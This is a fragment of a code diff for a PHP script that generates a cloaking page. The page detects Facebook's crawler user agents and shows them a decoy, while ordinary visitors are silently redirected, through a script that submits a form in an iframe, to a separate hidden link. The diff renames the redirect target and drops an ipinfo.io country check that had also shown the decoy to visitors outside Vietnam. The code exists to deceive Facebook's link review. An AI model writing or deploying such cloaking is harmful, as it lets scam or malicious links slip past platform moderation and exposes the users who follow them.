@@ -156,7 +156,7 @@ if ($_POST["url"]) {
 
   <script>
   function go() {
-  window.frames[0].document.body.innerHTML = \'<form target=\\"_parent\\" method=\\"get\\" action=\\"' . $tuUrl . '\\";></form>\';
+  window.frames[0].document.body.innerHTML = \'<form target=\\"_parent\\" method=\\"get\\" action=\\"' . $mainLink . '\\";></form>\';
   window.frames[0].document.forms[0].submit();
   }
   </script>
@@ -280,22 +280,11 @@ if ($_POST["url"]) {
 
     $phpString = '
 <?php
-$ip =  $_SERVER[\'REMOTE_ADDR\'];
-function ip_details($ip)
-{
-    $json       = file_get_contents("http://ipinfo.io/{$ip}");
-    $details    = json_decode($json);
-    return $details;
-}
-
-$details = ip_details($ip);
-$country = $details->country;
 if (
    strpos($_SERVER["HTTP_USER_AGENT"], "facebookplatform") !== false ||
-    strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit") !== false || strpos($_SERVER["HTTP_USER_AGENT"], "Facebot") !== false ||  $country !== "VN"
+    strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit") !== false || strpos($_SERVER["HTTP_USER_AGENT"], "Facebot") !== false
 ) {
 echo "' . $facebookCheat . '";
-
 die();
 
  }
